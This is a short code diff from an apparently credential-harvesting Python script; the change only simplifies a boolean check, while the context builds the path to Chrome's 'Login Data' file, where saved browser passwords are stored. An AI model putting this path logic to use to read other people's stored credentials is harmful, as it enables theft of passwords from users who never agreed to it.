@@ -16,7 +16,7 @@ if platform_type.find('Windows-10') == -1:
     is_Win_10 = False
 
 #gen way to file("Login Data" data base)
-if is_Win_10 == True: 
+if is_Win_10: 
     path = os.path.expandvars('C:\\Documents and Settings\\%USERNAME%\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Login Data')
 else:
     path = os.path.expandvars('C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
